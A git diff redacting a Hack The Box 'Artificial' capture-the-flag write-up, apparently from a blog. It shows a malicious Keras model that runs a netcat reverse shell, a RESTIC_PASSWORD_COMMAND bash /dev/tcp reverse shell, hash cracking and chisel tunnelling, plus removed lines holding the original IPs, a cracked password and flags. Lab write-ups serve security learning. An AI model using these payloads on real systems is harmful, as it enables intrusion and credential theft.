@@ -15,9 +15,9 @@ Author: [FisMatHack](https://app.hackthebox.com/users/1076236)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.43.221          
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx          
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 00:33 EDT
-Nmap scan report for artificial.htb (10.129.43.221)
+Nmap scan report for artificial.htb (10.129.xx.xx)
 Host is up (0.21s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.90 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.43.221     artificial.htb
+10.129.xx.xx     artificial.htb
 ```
 
 Let's check out the port `80` first.
@@ -197,7 +197,7 @@ import tensorflow as tf
 
 def exploit(x):
     import os
-    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.59 3333 >/tmp/f")
+    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.xx.xx.xx 3333 >/tmp/f")
     return x
 
 model = tf.keras.Sequential()
@@ -224,7 +224,7 @@ We got a reverse shell back to our kali machine.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 3333
 listening on [any] 3333 ...
-connect to [10.10.14.59] from (UNKNOWN) [10.129.43.221] 41340
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 41340
 /bin/sh: 0: can't access tty; job control turned off
 $ pwd
 /home/app/app
@@ -245,7 +245,7 @@ $ python3 -m http.server 8000
 ```
 
 ```bash
-└─$ wget http://10.129.43.221:8000/users.db
+└─$ wget http://10.129.xx.xx:8000/users.db
 ```
 
 Got our first, now gonna use `sqlite3` to check out the database.
@@ -257,7 +257,7 @@ Enter ".help" for usage hints.
 sqlite> .tables
 model  user 
 sqlite> select * from user;
-1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
+1|gael|gael@artificial.htb|<SNIP>
 2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
 3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
 4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
@@ -270,12 +270,12 @@ We gonna grab the password hash of `gael` user because when you check the `/home
 
 ![CrackStation](/assets/img/artifical-htb-season8/artifical-htb-season8_crackstation.png)
 
-Got the password: `mattp005numbertwo`. <br>
+Got the password: `mattp005xxxxxxxxx`. <br>
 &rarr; Let's ssh to `gael` user.
 
 ```bash
-└─$ ssh gael@10.129.43.221
-gael@10.129.43.221's password: 
+└─$ ssh gael@10.129.xx.xx
+gael@10.129.xx.xx's password: 
 gael@artificial:~$ ls -la
 total 32
 drwxr-x--- 4 gael gael 4096 Jun  9 08:53 .
@@ -290,7 +290,7 @@ lrwxrwxrwx 1 root root    9 Oct 19  2024 .sqlite_history -> /dev/null
 drwx------ 2 gael gael 4096 Sep  7  2024 .ssh
 -rw-r----- 1 root gael   33 Jun 23 04:31 user.txt
 gael@artificial:~$ cat user.txt
-e1a88abaaab58323180eb49d895a0dad
+e1a88axxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nail the `user.txt` flag.
@@ -405,16 +405,16 @@ There is a `.config` so check them out.
     "users": [
       {
         "name": "backrest_root",
-        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
+        "passwordBcrypt": "<SNIP>"
       }
     ]
   }
 }
 ```
 
-Found out there is a `backrest_root` user and the password hash is `JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWlpbkNtamVpMmtaRi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP`. <br>
+Found out there is a `backrest_root` user and the password hash is `<SNIP>`. <br>
 Seem like this password has been base64 encoded. Let's decode it. <br>
-&rarr; Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SkRKaEpERXdKR05XUjBsNU9WWk5XRkZrTUdkTk5XZHBia050YW1WcE1tdGFVaTlCUTAxTmExTnpjM0JpVW5WMFdWQTFPRVZDV25vdk1GRlA) and got this `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`.
+&rarr; Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SkRKaEpERXdKR05XUjBsNU9WWk5XRkZrTUdkTk5XZHBia050YW1WcE1tdGFVaTlCUTAxTmExTnpjM0JpVW5WMFdWQTFPRVZDV25vdk1GRlA) and got this `$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/<SNIP>/0QO`.
 
 Let's crack it.
 
@@ -432,15 +432,15 @@ Let's crack it.
 
 ```bash
 └─$ hashcat -m 3200 backrest_root.hash /usr/share/wordlists/rockyou.txt --show
-$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
+$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/<SNIP>/0QO:<SNIP>
 ```
 
-Got the password: `!@#$%^`. <br>
+Got the password: `<SNIP>`. <br>
 &rarr; Let's ssh to `backrest_root` user.
 
 ```bash
-└─$ ssh backrest_root@10.129.43.221      
-backrest_root@10.129.43.221's password: 
+└─$ ssh backrest_root@10.129.xx.xx      
+backrest_root@10.129.xx.xx's password: 
 Permission denied, please try again.
 ```
 
@@ -476,8 +476,8 @@ Found an interesting port `9898`. <br>
 ```
 
 ```bash
-gael@artificial:/tmp$ ./chisel client 10.10.14.59:9000 R:9898:127.0.0.1:9898
-2025/06/24 03:06:21 client: Connecting to ws://10.10.14.59:9000
+gael@artificial:/tmp$ ./chisel client 10.xx.xx.xx:9000 R:9898:127.0.0.1:9898
+2025/06/24 03:06:21 client: Connecting to ws://10.xx.xx.xx:9000
 2025/06/24 03:06:24 client: Connected (Latency 175.892494ms)
 ```
 
@@ -493,7 +493,7 @@ Perfectly tunneled. Let's check out the port `9898`.
 
 ![Port 9898](/assets/img/artifical-htb-season8/artifical-htb-season8_port_9898.png)
 
-Login with `backrest_root` user and password `!@#$%^`.
+Login with `backrest_root` user and password `<SNIP>`.
 
 ![Port 9898](/assets/img/artifical-htb-season8/artifical-htb-season8_port_9898_login.png)
 
@@ -554,7 +554,7 @@ This one `RESTIC_PASSWORD_COMMAND` make me thinking out what if we can leverage 
 Start by `Add Repo` again. And then in the `Env Vars` section, add this:
 
 ```bash
-RESTIC_PASSWORD_COMMAND=bash -c "bash -i >& /dev/tcp/10.10.14.59/1337 0>&1"
+RESTIC_PASSWORD_COMMAND=bash -c "bash -i >& /dev/tcp/10.xx.xx.xx/1337 0>&1"
 ```
 
 ![Add Repository](/assets/img/artifical-htb-season8/artifical-htb-season8_add_repository_4.png)
@@ -571,7 +571,7 @@ Now, submit the new one.
 ```bash
 └─$ rlwrap -cAr nc -lvnp 1337  
 listening on [any] 1337 ...
-connect to [10.10.14.59] from (UNKNOWN) [10.129.43.221] 58626
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 58626
 bash: cannot set terminal process group (12312): Inappropriate ioctl for device
 bash: no job control in this shell
 root@artificial:/#
@@ -598,7 +598,7 @@ drwxr-xr-x  2 root root 4096 Jun  9 13:57 scripts
 drwx------  2 root root 4096 Mar  4 22:40 .ssh
 root@artificial:~# cat root.txt
 cat root.txt
-f650c1fbbfe3c6104a05cc9f59673dc9
+f650c1xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Successfully grab the `root.txt` flag.
